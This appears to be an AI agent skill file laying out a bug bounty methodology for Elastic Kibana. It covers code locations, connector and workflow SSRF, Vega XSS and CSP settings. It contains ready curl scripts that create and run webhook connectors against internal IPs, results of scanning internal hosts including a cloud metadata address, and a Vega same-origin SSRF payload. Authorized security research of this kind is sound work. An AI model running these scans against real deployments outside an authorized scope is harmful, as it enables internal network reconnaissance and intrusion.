---
title: Elastic Kibana Bug Bounty Methodology
name: elastic-kibana-bug-bounty
description: Systematic methodology for finding vulnerabilities in Elastic Kibana (TypeScript/Node.js, 110K files). Covers architecture, attack surface, SSRF via connectors, Vega visualization XSS, CSP analysis, and API-driven testing.
---

# Elastic Kibana Bug Bounty Methodology

Target: Elastic Kibana on HackerOne ($150–$7k bounties, $50–$9k for ES).
Source: `~/Dev/elastic/kibana/`
Live instance: cloud.elastic.co (or self-hosted trial)

## Architecture Overview

- **Core**: `src/core/packages/` → organized by domain (`http/`, `elasticsearch/`, `saved-objects/`, `csp/`)
- **Plugins**: `src/platform/plugins/shared/` and `x-pack/platform/plugins/shared/`
- **Packages**: `packages/` (62 packages), `src/core/packages/` (sub-packages with suffixes: `-server`, `-browser`, `-internal`, `-mocks`, `common`)
- **CSP**: `src/core/packages/http/server-internal/src/csp/` — `csp_directives.ts` defines default rules, `config.ts` defines schema
- **Actions/Connectors**: `x-pack/platform/plugins/shared/actions/` — outbound HTTP framework
- **Stack Connectors**: `x-pack/platform/plugins/shared/stack_connectors/` — individual connector implementations
- **Workflows Engine**: `src/platform/plugins/shared/workflows_execution_engine/` — newer execution engine
- **Saved Objects**: `src/core/packages/saved-objects/` — import/export pipeline
- **Console Proxy**: `src/platform/plugins/shared/console/server/` — Dev Tools proxy to ES
- **Vega**: `src/platform/plugins/private/vis_types/vega/` — visualization grammar
- **Canvas**: `x-pack/platform/plugins/private/canvas/` — rich content workpads

## Attack Vectors

### 1. Connector SSRF (HIGH SIGNAL)

**Files:**
- `x-pack/platform/plugins/shared/actions/server/actions_config.ts` — `isHostnameAllowed`, `isUriAllowed`
- `x-pack/platform/plugins/shared/actions/server/lib/axios_utils.ts` — `request()` function calls `ensureUriAllowed(url)` at line 60
- `x-pack/platform/plugins/shared/actions/server/sub_action_framework/sub_action_connector.ts` — `ensureUriAllowed(url)` before request
- `x-pack/platform/plugins/shared/stack_connectors/server/connector_types/webhook/` — Webhook connector
- `x-pack/platform/plugins/shared/stack_connectors/server/connector_types/http/http_connector.ts` — HTTP connector (Workflows)

**Key Finding: `allowedHosts` defaults to `['*']`.**
- `actions_config.ts` line 106: `if (allowed.has(AllowedHosts.Any)) return true`
- `config.ts` for workflows: `defaultValue: ['*']` for `allowedHosts`
- On cloud.elastic.co, webhook connectors can reach **any internal IP** (confirmed via live testing)

**HTTP connector URL override (`.http`):**
- Line 306 of `http_connector.ts`: `const baseUrl = params.url || config.url;`
- `params.url` **takes precedence** over `config.url` at execution time
- The `url` param is rendered via Mustache templates from workflow context variables (line 160-162)
- This means: a connector configured to talk to `https://example.com/` can be overridden to target `http://10.0.0.1:9200/` at execution time by passing `params.url`
- The final URL IS validated by `request()` in `axios_utils.ts` (line 60: `ensureUriAllowed(url)`), but:
  - On cloud: Default `['*']` means any URL is allowed
  - Even on restricted deployments: template injection into `params.url` happens AFTER config-time validation, so the execution-time URL is only checked against the actions plugin's allowlist, not any per-connector restriction

**Always clean up test connectors after probing:**
```bash
curl -s -X DELETE "$BASE/api/actions/connector/$CID" \
  -H "Authorization: ApiKey $KEY" -H "kbn-xsrf: true"
```

**API-driven SSRF testing:**
```bash
# 1. Get API key from Kibana UI: Stack Management → API Keys
KEY="your-api-key-here"
BASE="https://your-deployment.us-central1.gcp.cloud.es.io"

# 2. Create a webhook to target
CID=$(curl -s "$BASE/api/actions/connector" \
  -H "Authorization: ApiKey $KEY" \
  -H "kbn-xsrf: true" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "ssrf-test",
    "connector_type_id": ".webhook",
    "secrets": {},
    "config": { "url": "http://TARGET_IP:PORT/", "method": "get" }
  }' | python3 -c "import sys,json; print(json.load(sys.stdin).get('id',''))")

# 3. Execute it
curl -s "$BASE/api/actions/connector/$CID/_execute" \
  -H "Authorization: ApiKey $KEY" -H "kbn-xsrf: true" -H "Content-Type: application/json" \
  -d '{"params": {"body": "test"}}'

# 4. Clean up
curl -s -X DELETE "$BASE/api/actions/connector/$CID" \
  -H "Authorization: ApiKey $KEY" -H "kbn-xsrf: true"
```

**Error code interpretation:**
- `ECONNREFUSED` — port is closed (nothing listening)
- `ETIMEDOUT` — host is routable but no response (firewalled or filtered)
- `EHOSTUNREACH` — host is not routable (network-level block)
- `ENOTFOUND` — DNS resolution failed
- `200 OK + data` — SUCCESS! Service is reachable

**Redirect validation:** `getBeforeRedirectFn` in `before_redirect.ts` checks `options.hostname` via `ensureHostnameAllowed` at redirect time. Only hostname check, no URL parser differential protection.

### Cloud.elastic.co Live Testing Results (Kibana 9.4.2)

**Connector SSRF confirmed:** No host allowlist restriction on cloud.elastic.co deployment. Both `.webhook` and `.http` connectors accept arbitrary internal IPs/URLs.

**Internal network scan results:**

| Target | Error | Meaning |
|--------|-------|---------|
| `127.0.0.1:*` | ECONNREFUSED | localhost has no services |
| `kibana:5601` | ENOTFOUND | No K8s DNS |
| `elasticsearch:9200` | ENOTFOUND | No K8s DNS |
| `10.0.0.1:9200` | ETIMEDOUT (60s) | Routable but port-filtered |
| `172.17.0.1:5601` | ETIMEDOUT | Docker bridge filtered |
| `169.254.169.254:80` | EHOSTUNREACH | GCP metadata blocked |
| `metadata.google.internal:80` | EHOSTUNREACH | GCP DNS resolves but blocked |

**Architecture insight:** Kibana and ES run in separate containers on cloud. No K8s DNS for internal services. GCP metadata firewalled at hypervisor level (GKE). The 10.x.x.x subnet is routable but port-filtered.

**Two allowlist systems (config gap):**
1. Actions plugin: `xpack.actions.allowedHosts` — used by `request()` in `axios_utils.ts`
2. Workflows engine: `workflowsExecutionEngine.http.allowedHosts` — separate config key
Both default to `['*']`. If admin configures one but not the other, the unconfigured one stays permissive.

### 2. Workflows Execution Engine SSRF

**Files:**
- `src/platform/plugins/shared/workflows_execution_engine/server/config.ts` — `allowedHosts` defaults to `['*']`
- `src/platform/plugins/shared/workflows_execution_engine/server/lib/url_validator.ts` — `UrlValidator` class with `isHostnameAllowed`
- `src/platform/plugins/shared/workflows_execution_engine/server/step/connector_step.ts` — `getInput()` renders template variables into step params
- `x-pack/platform/plugins/shared/stack_connectors/server/connector_types/http/http_connector.ts` — line 306: `const baseUrl = params.url || config.url` (params.url overrides config URL)

**Template injection into URL:**
- `params.url` is rendered via Mustache templates from workflow context variables
- Line 306: `params.url` takes precedence over `config.url`
- The rendered URL IS validated by `request()` at execution time (against actions plugin's allowlist), but:
  - Default `['*']` means no restriction
  - Template variables can inject arbitrary values

**Two-allowlist bypass risk:**
- Workflow validates URL with `UrlValidator` (workflows config)
- But actual request goes through `request()` (actions config)
- If workflows config is `['*']` but actions config is restricted → workflow step blocked by actions validation
- If actions config is `['*']` but workflows config is restricted → workflow step validated by workflows but **not** by actions

### 3. Vega Visualization XSS

**Files:**
- `src/platform/plugins/private/vis_types/vega/public/vega_view/vega_base_view.js` — expression interpreter, URL loader sanitizer
- `src/platform/plugins/private/vis_types/vega/public/vega_view/vega_tooltip.js` — tooltip uses `innerHTML` with `_.escape`
- `src/platform/plugins/private/vis_types/vega/public/vega_view/utils.ts` — object normalization
- `src/platform/plugins/private/vis_types/vega/public/data_model/vega_parser.ts` — spec parser

**Expression sandbox:** Vega uses `vega-interpreter` with `ast: true` mode (AST interpretation, not eval). This is the primary XSS protection. Multiple past CVEs (CVE-2025-68385, CVE-2025-59840, CVE-2025-25009) have bypassed this sandbox.

**Version:** `vega-interpreter@2.2.1` (bundled in Kibana 9.4.2/9.5.0)

**CSP context:** `script-src 'report-sample' 'self'` — no `unsafe-eval`, no nonces, no `strict-dynamic`.
- On cloud.elastic.co: CSP is strict — `'unsafe-eval'` is NOT present (confirmed via live test)
- In default Kibana source code: CSP includes `'unsafe-eval'` at line 229 of `csp_directives.ts` (unless `csp.disableUnsafeEval: true`)

**Tooltip HTML injection:**
```javascript
// vega_tooltip.js line 70
el.innerHTML = createTooltipContent(value, _.escape, 2);
```
Uses lodash `_.escape` + `vega-tooltip`'s `formatValue`. `_.escape` escapes `& < > " '`. Confirmed escaped on cloud.elastic.co.

**Same-origin SSRF via Vega URL data source:**
```json
{
  "data": [{
    "name": "table",
    "url": "../api/status"
  }]
}
```
Works even with `enableExternalUrls: false` (default). Can reach any same-origin Kibana API endpoint. Path traversal (`../`) works.

**Expression functions exposed:**
Only 4 whitelisted: `kibanaAddFilter`, `kibanaRemoveFilter`, `kibanaRemoveAllFilters`, `kibanaSetTimeFilter`. Parameter normalization applied to all inputs.

### 4. Console/Dev Tools Proxy

**Files:**
- `src/platform/plugins/shared/console/server/routes/api/console/proxy/create_handler.ts` — proxy handler
- `src/platform/plugins/shared/console/server/lib/proxy_request.ts` — raw HTTP proxy

**Host validation:** Host must match one of the configured ES hosts (exact match after credential stripping). Well-defended against SSRF.

### 5. Saved Objects Import

**Files:**
- `src/core/packages/saved-objects/import-export-server-internal/src/import/import_saved_objects.ts`
- `src/core/packages/saved-objects/server-internal/src/routes/import.ts`

NDJSON → split on `\n` → `JSON.parse` → filter → collect → bulk create. Clean pipeline, no injection vectors found.

### 6. CSP Configuration

**Files:**
- `src/core/packages/http/server-internal/src/csp/config.ts` — schema with `strict: true` default
- `src/core/packages/http/server-internal/src/csp/csp_directives.ts` — default rules, `strict-dynamic` keyword token
- `src/core/packages/http/server-internal/src/csp/csp_config.ts` — `CspConfig` class

**Default CSP (from source):**
```
script-src 'report-sample' 'self' 'unsafe-eval'
```
`'unsafe-eval'` added at line 229 of `csp_directives.ts` unless `disableUnsafeEval: true`

**cloud.elastic.co CSP (confirmed live):**
```
script-src 'report-sample' 'self'
```
No `unsafe-eval`, no nonces. `disableUnsafeEval: true` is set on cloud.

**Style-src:** `'unsafe-inline'` is present (CSS injection possible but limited)

## API Testing Automation

When you have API key access to a Kibana instance, use the REST API directly instead of clicking through the UI:

```bash
# List connector types
curl -s "$BASE/api/actions/connector_types" \
  -H "Authorization: ApiKey $KEY" -H "kbn-xsrf: true"

# List existing connectors
curl -s "$BASE/api/actions/connectors" \
  -H "Authorization: ApiKey $KEY" -H "kbn-xsrf: true"

# Create and execute in one shot (SSRF scan)
CID=$(curl -s "$BASE/api/actions/connector" \
  -H "Authorization: ApiKey $KEY" -H "kbn-xsrf: true" -H "Content-Type: application/json" \
  -d '{"name":"scan","connector_type_id":".webhook","secrets":{},"config":{"url":"http://TARGET/","method":"get","hasAuth":false}}' \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('id',''))")

curl -s "$BASE/api/actions/connector/$CID/_execute" \
  -H "Authorization: ApiKey $KEY" -H "kbn-xsrf: true" -H "Content-Type: application/json" \
  -d '{"params":{}}'

# Delete after use
curl -s -X DELETE "$BASE/api/actions/connector/$CID" \
  -H "Authorization: ApiKey $KEY" -H "kbn-xsrf: true"
```

## Report Structure

```
~/Dev/REPORTS/Elastic/<SubmissionNumber>/<finding-name>/
├── REPORT.md           ← Standalone writeup, NOT in zip
└── poc/
    ├── poc-script.py   ← Working exploit
    └── submission.zip  ← PoC archive for HackerOne
```

## Recent CVEs & Advisories to Watch for SSRF/XSS gaps

- **ESA-2026-37/40** — SSRF via connector allowlist bypass (9.2.8+, 9.3.2+)
- **ESA-2026-28** — Workflows execution engine host allowlist bypass (9.3.3+)
- **ESA-2026-17** — Workflows template injection CWE-1336 → SSRF/file read (9.3.1+)
- **ESA-2026-05** — Google Gemini connector file disclosure via credentials JSON (9.2.4+)
- **CVE-2025-68385** — Vega visualization XSS
- **CVE-2025-59840** — Vega-interpreter sandbox escape (toString gadget chains)
- **CVE-2025-25017** — Vega XSS
- **CVE-2025-25009** — Stored XSS via case file upload (CVSS 8.7)
- **CVE-2025-25018** — Stored XSS in Fleet integration upload
- **CVE-2025-25014** — Critical RCE (CVSS 9.1)
- **CVE-2024-37287** — Prototype tainting RCE via ML/Alerting connectors

## Absorbed Skills

This skill absorbed `elastic-stack-bug-bounty` (archived), which covered the same Elastic Kibana + ES program but was less comprehensive and explicitly noted this skill as the primary reference. Content merged:

- **`references/kibana-codebase-map.md`** — Kibana v9+ directory layout, CSP bypass notes, SSRF protection summary, and key file path table. Extracted from the absorbed skill.

## References

- ES|Kibana advisory archives: discuss.elastic.co/c/announcements/security-announcements/security/
- stack.watch/product/elasticsearch/kibana/ — CVE tracking
- Elastic HackerOne program: hackerone.com/elastic
- Vega interpreter docs: vega.github.io/vega/usage/interpreter/
- Workflows security audit report: `~/Dev/elastic/kibana/workflows_security_audit_report.md` (contains detailed findings on template injection, dual-allowlist risk, URL validator gaps)
- **Dual-allowlist risk**: `references/workflows-dual-allowlist-risk.md` — two separate `allowedHosts` configs (actions + workflows), the gap when one is configured but not the other, execution-time URL override via template injection
- **Kibana codebase map**: `references/kibana-codebase-map.md` — v9+ directory layout with CSP, actions/connectors, console proxy, saved objects, and SSRF protection summary
